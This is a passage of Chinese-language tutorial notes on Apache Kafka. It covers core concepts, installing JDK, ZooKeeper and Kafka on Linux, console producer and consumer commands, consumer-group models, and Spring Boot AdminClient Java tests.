rel="noopener">http://kafka.apache.org/</a></p><ul><li><p>是由Apache软件基金会开发的一个开源流处理平台，由Scala和Java编写。Kafka是一种高吞吐量的分布式发布订阅消息系统(严格意义上是不属于队列产品，是一个流处理平台)，它可以处理大规模的网站中的所有动作流数据(网页浏览，搜索和其他用户的行动)，副本集机制，实现数据冗余，保障数据尽量不丢失；支持多个生产者和消费者</p></li><li><p>类似MQ，功能较为简单，主要支持常规的MQ功能</p></li><li><p>它提供了类似于JMS的特性，但是在设计实现上完全不同，它并不是JMS规范的实现</p></li><li><p>缺点：运维难度大，文档比较少, 需要掌握Scala</p></li></ul></li><li><p>RocketMQ：<a href="http://rocketmq.apache.org/" target="_blank" rel="noopener">http://rocketmq.apache.org/</a></p><ul><li>阿里开源的一款的消息中间件, 纯Java开发，具有高吞吐量、高可用性、适合大规模分布式系统应用的特点, 性能强劲(零拷贝技术)，支持海量堆积, 支持指定次数和时间间隔的失败消息重发,支持consumer端tag过滤、延迟消息等，在阿里内部进行大规模使用，适合在电商，互联网金融等领域</li><li>基于JMS Provider的实现</li><li>缺点：社区相对不活跃，更新比较快，纯java支持</li></ul></li><li><p>RabbitMQ：<a href="http://www.rabbitmq.com/" target="_blank" rel="noopener">http://www.rabbitmq.com/</a></p><ul><li>是一个开源的AMQP实现，服务器端用Erlang语言编写，支持多种客户端，如：Python、Ruby、.NET、Java、C、用于在分布式系统中存储转发消息，在易用性、扩展性、高可用性等方面表现不错</li><li>缺点：使用Erlang开发，阅读和修改源码难度大</li></ul></li></ul></li></ul><h1 id="Kafka核心概念-安装部署实战"><a href="#Kafka核心概念-安装部署实战" class="headerlink" title="Kafka核心概念+安装部署实战"></a>Kafka核心概念+安装部署实战</h1><h2 id="分布式流处理平台kafka快速认知"><a href="#分布式流处理平台kafka快速认知" class="headerlink" title="分布式流处理平台kafka快速认知"></a>分布式流处理平台kafka快速认知</h2><p>Kafka</p><ul><li><p>Kafka是最初由Linkedin公司开发，Linkedin于2010年贡献给了Apache基金会并成为顶级开源项目，也是一个开源【分布式流处理平台】，由Scala和Java编写，（也当做MQ系统，但不是纯粹的消息系统）</p><ul><li>open-source distributed event streaming platform</li></ul></li><li><p>核心：一种高吞吐量的分布式流处理平台，它可以处理消费者在网站中的所有动作流数据。</p><ul><li>比如 网页浏览，搜索和其他用户的行为等，应用于大数据实时处理领域</li></ul></li><li><p>官网：<a href="http://kafka.apache.org/" target="_blank" rel="noopener">http://kafka.apache.org/</a></p></li><li><p>快速开始：<a href="http://kafka.apache.org/quickstart" target="_blank" rel="noopener">http://kafka.apache.org/quickstart</a></p></li><li><p>快速认识概念</p><ul><li>Broker<ul><li>Kafka的服务端程序，可以认为一个mq节点就是一个broker</li><li>broker存储topic的数据</li></ul></li><li>Producer生产者<ul><li>创建消息Message，然后发布到MQ中</li><li>该角色将消息发布到Kafka的topic中</li></ul></li><li>Consumer消费者:<ul><li>消费队列里面的消息</li></ul></li></ul><p><img src="https://file.xdclass.net/note/2021/kafka/img/Untitled%20Diagram.png" alt="Untitled Diagram"></p></li></ul><h2 id="分布式流处理平台Kafka核心概念"><a href="#分布式流处理平台Kafka核心概念" class="headerlink" title="分布式流处理平台Kafka核心概念"></a>分布式流处理平台Kafka核心概念</h2><p>核心概念</p><ul><li>Broker<ul><li>Kafka的服务端程序，可以认为一个mq节点就是一个broker</li><li>broker存储topic的数据</li></ul></li><li>Producer生产者<ul><li>创建消息Message，然后发布到MQ中</li><li>该角色将消息发布到Kafka的topic中</li></ul></li><li>Consumer消费者:<ul><li>消费队列里面的消息</li></ul></li><li>ConsumerGroup消费者组<ul><li>同个topic, 广播发送给不同的group，一个group中只有一个consumer可以消费此消息</li></ul></li><li>Topic<ul><li>每条发布到Kafka集群的消息都有一个类别，这个类别被称为Topic，主题的意思</li></ul></li><li>Partition分区<ul><li>kafka数据存储的基本单元，topic中的数据分割为一个或多个partition，每个topic至少有一个partition，是有序的</li><li>一个Topic的多个partitions, 被分布在kafka集群中的多个server上</li><li>消费者数量 &lt;=小于或者等于Partition数量</li></ul></li><li>Replication 副本（备胎）<ul><li>同个Partition会有多个副本replication ，多个副本的数据是一样的，当其他broker挂掉后，系统可以主动用副本提供服务</li><li>默认每个topic的副本都是1（默认是没有副本，节省资源），也可以在创建topic的时候指定</li><li>如果当前kafka集群只有3个broker节点，则replication-factor最大就是3了，如果创建副本为4，则会报错</li></ul></li><li>ReplicationLeader、ReplicationFollower<ul><li>Partition有多个副本，但只有一个replicationLeader负责该Partition和生产者消费者交互</li><li>ReplicationFollower只是做一个备份，从replicationLeader进行同步</li></ul></li><li>ReplicationManager<ul><li>负责Broker所有分区副本信息，Replication 副本状态切换</li></ul></li><li>offset<ul><li>每个consumer实例需要为他消费的partition维护一个记录自己消费到哪里的偏移offset</li><li>kafka把offset保存在消费端的消费者组里</li></ul></li><li>特点总结<ul><li>多订阅者<ul><li>一个topic可以有一个或者多个订阅者</li><li>每个订阅者都要有一个partition，所以订阅者数量要少于等于partition数量</li></ul></li><li>高吞吐量、低延迟: 每秒可以处理几十万条消息</li><li>高并发：几千个客户端同时读写</li><li>容错性：多副本、多分区，允许集群中节点失败，如果副本数据量为n,则可以n-1个节点失败</li><li>扩展性强：支持热扩展</li></ul></li><li>基于消费者组可以实现：<ul><li>基于队列的模型：所有消费者都在同一消费者组里，每条消息只会被一个消费者处理</li><li>基于发布订阅模型：消费者属于不同的消费者组，假如每个消费者都有自己的消费者组，这样kafka消息就能广播到所有消费者实例上</li></ul></li></ul><h2 id="Kafka相关环境准备和安装JDK8"><a href="#Kafka相关环境准备和安装JDK8" class="headerlink" title="Kafka相关环境准备和安装JDK8"></a>Kafka相关环境准备和安装JDK8</h2><ul><li><p>需要的软件和环境版本说明</p><ul><li>kafka-xx-yy<ul><li>xx 是scala版本，yy是kafka版本（scala是基于jdk开发，需要安装jdk环境）</li><li>下载地址：<a href="http://kafka.apache.org/downloads" target="_blank" rel="noopener">http://kafka.apache.org/downloads</a></li></ul></li><li>zookeeper<ul><li>Apache 软件基金会的一个软件项目，它为大型分布式计算提供开源的分布式配置服务、同步服务和命名注册</li><li>下载地址：<a href="https://zookeeper.apache.org/releases.html" target="_blank" rel="noopener">https://zookeeper.apache.org/releases.html</a></li></ul></li><li>jdk1.8</li></ul></li><li><p>步骤</p><ul><li><p>上传安装包（zk、jdk、kafka）</p></li><li><p>安装jdk</p><ul><li><p>配置全局环境变量</p><ul><li><p>解压：tar -zxvf jdk-8u181-linux-x64.tar.gz</p></li><li><p>重命名</p></li><li><p>vim /etc/profile</p></li><li><p>配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JAVA_HOME=/usr/local/software/jdk1.8</span><br><span class="line">CLASSPATH=$JAVA_HOME/lib/</span><br><span class="line">PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line">export PATH JAVA_HOME CLASSPATH</span><br></pre></td></tr></table></figure></li><li><p>环境变量立刻生效</p><ul><li>source /etc/profile</li></ul></li></ul></li><li><p>查看安装情况 java -version</p></li></ul></li></ul></li></ul><h2 id="Linux环境下Zookeeper和Kafka安装启动"><a href="#Linux环境下Zookeeper和Kafka安装启动" class="headerlink" title="Linux环境下Zookeeper和Kafka安装启动"></a>Linux环境下Zookeeper和Kafka安装启动</h2><ul><li><p>安装Zookeeper (默认2181端口)</p><ul><li>默认配置文件 zoo.cfg</li><li>启动zk<ul><li>bin/zkServer.sh start</li></ul></li></ul></li><li><p>安装Kafka (默认 9092端口)</p><ul><li><p>config目录下 server.properties</p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210610113205.png" alt="image-20210610113152510" style="zoom: 67%;" /><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#标识broker编号，集群中有多个broker，则每个broker的编号需要设置不同</span></span><br><span class="line"><span class="meta">broker.id</span>=<span class="string">0</span></span><br><span class="line"><span class="comment">#修改下面两个配置 ( listeners 配置的ip和advertised.listeners相同时启动kafka会报错)</span></span><br><span class="line"><span class="attr">listeners(内网Ip)</span></span><br><span class="line"><span class="attr">advertised.listeners(公网ip)</span></span><br><span class="line"><span class="comment">#修改zk地址,默认地址</span></span><br><span class="line"><span class="meta">zookeeper.connection</span>=<span class="string">localhost:2181</span></span><br></pre></td></tr></table></figure></li><li><p>bin目录启动和停止</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动</span></span><br><span class="line">./kafka-server-start.sh  ../config/server.properties &amp;</span><br><span class="line"><span class="comment">#停止</span></span><br><span class="line">kafka-server-stop.sh</span><br></pre></td></tr></table></figure></li><li><p>创建topic</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-topics.sh --create --zookeeper 101.132.252.118:2181 --replication-factor 1 --partitions 1 --topic xdclass-topic</span><br></pre></td></tr></table></figure></li><li><p>查看topic</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-topics.sh --list --zookeeper 101.132.252.118:2181</span><br></pre></td></tr></table></figure></li><li><p>Linux环境下daemon守护进程运行Kafka</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-server-start.sh -daemon ../config/server.properties &amp;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h1 id="Kafka点对点-发布订阅模型讲解和写入存储流程实战"><a href="#Kafka点对点-发布订阅模型讲解和写入存储流程实战" class="headerlink" title="Kafka点对点-发布订阅模型讲解和写入存储流程实战"></a>Kafka点对点-发布订阅模型讲解和写入存储流程实战</h1><h2 id="Kafka命令行生产者发送消息和消费者消费消息实战"><a href="#Kafka命令行生产者发送消息和消费者消费消息实战" class="headerlink" title="Kafka命令行生产者发送消息和消费者消费消息实战"></a>Kafka命令行生产者发送消息和消费者消费消息实战</h2><ul><li><p>创建topic</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/software/kafka/bin</span><br><span class="line">./kafka-topics.sh --create --zookeeper 101.132.252.118:2181 --replication-factor 1 --partitions 2 --topic xdclass-topic</span><br></pre></td></tr></table></figure></li><li><p>查看topic</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-topics.sh --list --zookeeper 101.132.252.118:2181</span><br></pre></td></tr></table></figure></li><li><p>生产者发送消息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-console-producer.sh --broker-list 101.132.252.118:9092  --topic version1-topic</span><br></pre></td></tr></table></figure></li><li><p>消费者消费消息 ( –from-beginning：会把主题中以往所有的数据都读取出来, 重启后会有这个重复消费）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-console-consumer.sh --bootstrap-server 101.132.252.118:9092 --from-beginning --topic version1-topic</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210610114448.png" alt="image-20210610114445032"></p></li><li><p>删除topic</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-topics.sh --zookeeper 101.132.252.118:2181 --delete --topic t1</span><br></pre></td></tr></table></figure></li><li><p>查看broker节点topic状态信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-topics.sh --describe --zookeeper 101.132.252.118:2181  --topic xdclass-topic</span><br></pre></td></tr></table></figure></li></ul><h2 id="Kafka点对点模型和发布订阅模型"><a href="#Kafka点对点模型和发布订阅模型" class="headerlink" title="Kafka点对点模型和发布订阅模型"></a>Kafka点对点模型和发布订阅模型</h2><ul><li>JMS规范目前支持两种消息模型<ul><li>点对点（point to point)<ul><li>消息生产者生产消息发送到queue中，然后消息消费者从queue中取出并且消费消息</li><li>消息被消费以后，queue中不再有存储，所以消息消费者不可能消费到已经被消费的消息。 Queue支持存在多个消费者，但是对一个消息而言，只会有一个消费者可以消费</li></ul></li><li>发布/订阅（publish/subscribe）<ul><li>消息生产者（发布）将消息发布到topic中，同时有多个消息消费者（订阅）消费该消息。</li><li>和点对点方式不同，发布到topic的消息会被所有订阅者消费。</li></ul></li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210610130420.png" alt="image-20210610130417875"></p><h2 id="Kafka消费者组配置实现点对点消费模型"><a href="#Kafka消费者组配置实现点对点消费模型" class="headerlink" title="Kafka消费者组配置实现点对点消费模型"></a>Kafka消费者组配置实现点对点消费模型</h2><ul><li><p>编辑消费者配置（确保同个名称group.id一样）</p><ul><li>编辑 config/consumer.properties</li></ul></li><li><p>创建topic, 1个分区</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-topics.sh --create --zookeeper 112.74.55.160:2181 --replication-factor 1 --partitions 2 --topic xdclass-topic</span><br></pre></td></tr></table></figure></li><li><p>指定配置文件启动 两个消费者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-console-consumer.sh --bootstrap-server 101.132.252.118:9092 --from-beginning --topic xdclass-topic --consumer.config ../config/consumer.properties</span><br></pre></td></tr></table></figure></li><li><p>现象</p><ul><li>只有一个消费者可以消费到数据，一个分区只能被同个消费者组下的某个消费者进行消费</li></ul></li></ul><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210610132352.png" alt="image-20210610132337485" style="zoom: 67%;" /><h2 id="Kafka消费者组配置实现发布订阅消费模型"><a href="#Kafka消费者组配置实现发布订阅消费模型" class="headerlink" title="Kafka消费者组配置实现发布订阅消费模型"></a>Kafka消费者组配置实现发布订阅消费模型</h2><ul><li><p>编辑消费者配置（确保group.id 不一样）</p><ul><li>cp config/consumer.properties config/consumer-1.properties</li><li>cp config/consumer.properties config/consumer-2.properties</li><li>编辑 config/consumer-1.properties</li><li>编辑 config/consumer-2.properties</li></ul></li><li><p>创建topic, 2个分区</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-topics.sh --create --zookeeper 101.132.252.118:2181 --replication-factor 1 --partitions 1--topic xdclass-topic</span><br></pre></td></tr></table></figure></li><li><p>生产者生产消息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-console-producer.sh --broker-list 101.132.252.118:9092  --topic xdclass-topic</span><br></pre></td></tr></table></figure></li><li><p>指定配置文件启动两个消费者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./kafka-console-consumer.sh --bootstrap-server 101.132.252.118:9092 --from-beginning --topic xdclass-topic --consumer.config ../config/consumer1.properties</span><br><span class="line"></span><br><span class="line">./kafka-console-consumer.sh --bootstrap-server 101.132.252.118:9092 --from-beginning --topic xdclass-topic --consumer.config ../config/consumer2.properties</span><br></pre></td></tr></table></figure></li><li><p>现象</p><ul><li>两个不同消费者组的节点，都可以消费到消息，实现发布订阅模型</li></ul></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613152149.png" alt="image-20210610134550679"></p><h2 id="Kafka数据存储流程和原理概述和LEO-HW"><a href="#Kafka数据存储流程和原理概述和LEO-HW" class="headerlink" title="Kafka数据存储流程和原理概述和LEO+HW"></a>Kafka数据存储流程和原理概述和LEO+HW</h2><p><strong>Partition</strong></p><ul><li>topic物理上的分组，一个topic可以分为多个partition，每个partition是一个有序的队列</li><li>是以文件夹的形式存储在具体Broker本机上</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613152455.png" alt="image-20210613152452852"></p><p><strong>LEO（LogEndOffset）</strong></p><ul><li>表示每个partition的log最后一条Message的位置。</li></ul><p><strong>HW（HighWatermark）</strong></p><ul><li>表示partition各个replicas数据间同步且一致的offset位置，即表示allreplicas已经commit的位置</li><li>HW之前的数据才是Commit后的，对消费者才可见</li><li>ISR集合里面最小leo</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210613152603.png" alt="image-20210613152600594"></p><p><strong>offset</strong>：</p><ul><li>每个partition都由一系列有序的、不可变的消息组成，这些消息被连续的追加到partition中</li><li>partition中的每个消息都有一个连续的序列号叫做offset，用于partition唯一标识一条消息</li><li>可以认为offset是partition中Message的id</li></ul><p><strong>Segment</strong>：每个partition又由多个segment file组成；</p><ul><li>segment file 由2部分组成，分别为index file和data file（log file），</li><li>两个文件是一一对应的，后缀”.index”和”.log”分别表示索引文件和数据文件</li><li>命名规则：partition的第一个segment从0开始，后续每个segment文件名为上一个segment文件最后一条消息的offset+1</li></ul><p><strong>Kafka高效文件存储设计特点：</strong></p><ul><li>Kafka把topic中一个parition大文件分成多个小文件段，通过多个小文件段，就容易定期清除或删除已经消费完文件，减少磁盘占用。</li><li>通过索引信息可以快速定位message</li><li>producer生产数据，要写入到log文件中，写的过程中一直追加到文件末尾，为顺序写，官网数据表明。同样的磁盘，顺序写能到600M/S，而随机写只有100K/S</li></ul><h1 id="SpringBoot2-X项目整合-Kafka核心API-Admin实战"><a href="#SpringBoot2-X项目整合-Kafka核心API-Admin实战" class="headerlink" title="SpringBoot2.X项目整合-Kafka核心API-Admin实战"></a>SpringBoot2.X项目整合-Kafka核心API-Admin实战</h1><h2 id="SpringBoot2-X项目搭建整合Kafka客户端依赖配置"><a href="#SpringBoot2-X项目搭建整合Kafka客户端依赖配置" class="headerlink" title="SpringBoot2.X项目搭建整合Kafka客户端依赖配置"></a><strong>SpringBoot2.X项目搭建整合Kafka客户端依赖配置</strong></h2><p>新版SpringBoot2.X介绍</p><ul><li>官网：<a href="https://spring.io/projects/spring-boot" target="_blank" rel="noopener">https://spring.io/projects/spring-boot</a></li><li>GitHub地址：<a href="https://github.com/spring-projects/spring-boot" target="_blank" rel="noopener">https://github.com/spring-projects/spring-boot</a></li><li>官方文档：<a href="https://spring.io/guides/gs/spring-boot/" target="_blank" rel="noopener">https://spring.io/guides/gs/spring-boot/</a></li><li>视频地址：<a href="https://item.taobao.com/item.htm?id=618384570391" target="_blank" rel="noopener">https://item.taobao.com/item.htm?id=618384570391</a></li></ul><p>相关软件环境和作用</p><ul><li>JDK1.8+以上</li><li>Maven3.5+</li><li>编辑器IDEA(旗舰版)</li></ul><p>在线创建 ：<a href="https://start.spring.io/" target="_blank" rel="noopener">https://start.spring.io/</a></p><ul><li>注意：<ul><li>采用springboot2.5 + jdk11</li><li>初次导入项目下载包比较慢 5~20分钟不等<ul><li>出问题的话: mvn clean install 试试</li></ul></li><li>不建议修改默认maven仓库（可以先还原默认的，防止下载包失败）</li><li>idea记得配置jdk11</li></ul></li></ul><p>在SpringBoot整合kafka很简单</p><ul><li><p>添加依赖 kafka-clients</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.kafka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kafka-clients<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="SpringBoot2-x整合Kafka客户端-adminApi单元测试"><a href="#SpringBoot2-x整合Kafka客户端-adminApi单元测试" class="headerlink" title="SpringBoot2.x整合Kafka客户端+adminApi单元测试"></a>SpringBoot2.x整合Kafka客户端+adminApi单元测试</h2><p>单元测试配置客户端+创建topic</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 设置admin 客户端</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> AdminClient <span class="title">initAdminClient</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">    properties.setProperty(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG,<span class="string">"101.132.252.118:9092"</span>);</span><br><span class="line"></span><br><span class="line">    AdminClient adminClient = AdminClient.create(properties);</span><br><span class="line">    <span class="keyword">return</span> adminClient;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">createTopic</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    AdminClient adminClient = initAdminClient();</span><br><span class="line">    <span class="comment">// 2个分区，1个副本</span></span><br><span class="line">    NewTopic newTopic = <span class="keyword">new</span> NewTopic(TOPIC_NAME, <span class="number">2</span> , (<span class="keyword">short</span>) <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    CreateTopicsResult createTopicsResult = adminClient.createTopics(Arrays.asList(newTopic));</span><br><span class="line">    <span class="comment">//future等待创建，成功不会有任何报错，如果创建失败和超时会报错。</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        createTopicsResult.all().get();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">"创建新的topic"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看topic</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-topics.sh --list --zookeeper 101.132.252.118:2181</span><br></pre></td></tr></table></figure><p>查看broker节点topic状态信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kafka-topics.sh --describe --zookeeper 101.132.252.118:2181  --topic xdclass-sp-topic-test</span><br></pre></td></tr></table></figure><h2 id="Kafka使用JavaAPI-AdminClient删除和列举topic"><a href="#Kafka使用JavaAPI-AdminClient删除和列举topic" class="headerlink" title="Kafka使用JavaAPI-AdminClient删除和列举topic"></a>Kafka使用JavaAPI-AdminClient删除和列举topic</h2><p>list列举</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">listTopic</span><span class="params">()</span> <span class="keyword">throws</span> ExecutionException, InterruptedException </span>&#123;</span><br><span class="line">    AdminClient adminClient = initAdminClient();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//是否查看内部的topic,可以不用</span></span><br><span class="line">    ListTopicsOptions options = <span class="keyword">new</span> ListTopicsOptions();</span><br><span class="line">    options.listInternal(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    ListTopicsResult listTopics = adminClient.listTopics(options);</span><br><span class="line">    Set&lt;String&gt; topics = listTopics.names().get();</span><br><span class="line">    <span class="keyword">for</span> (String topic : topics) &#123;</span><br><span class="line">        System.err.println(topic);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>删除</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//删除</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">delTopicTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    AdminClient adminClient = initAdminClient();</span><br><span class="line">    DeleteTopicsResult deleteTopicsResult = adminClient.deleteTopics(Arrays.asList(<span class="string">"xdclass-sp11-topic"</span>));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        deleteTopicsResult.all().get();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AdminClientApi查看Topic详情和增加分区数量"><a href="#AdminClientApi查看Topic详情和增加分区数量" class="headerlink" title="AdminClientApi查看Topic详情和增加分区数量"></a>AdminClientApi查看Topic详情和增加分区数量</h2><p>查看topic详情</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取指定topic的详细信息</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">getTopicInfo</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    AdminClient adminClient = initAdminClient();</span><br><span class="line">    DescribeTopicsResult describeTopicsResult = adminClient.describeTopics(Arrays.asList(TOPIC_NAME));</span><br><span class="line"></span><br><span class="line">    Map&lt;String, TopicDescription&gt; stringTopicDescriptionMap = describeTopicsResult.all().get();</span><br><span class="line"></span><br><span class="line">    Set&lt;Map.Entry&lt;String, TopicDescription&gt;&gt; entries = stringTopicDescriptionMap.entrySet();</span><br><span class="line"></span><br><span class="line">    entries.stream().forEach((entry)-&gt; System.out.println(<span class="string">"name ："</span>+entry.getKey()+<span class="string">" , desc: "</span>+ entry.getValue()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增加分区数量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 增加分区数量</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 如果当主题中的消息包含有key时(即key不为null)，根据key来计算分区的行为就会有所影响消息顺序性</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 注意：Kafka中的分区数只能增加不能减少，减少的话数据不知怎么处理</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">incrPartitionsTest</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Map&lt;String, NewPartitions&gt; infoMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    NewPartitions newPartitions = NewPartitions.increaseTo(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    AdminClient adminClient = initAdminClient();</span><br><span class="line">    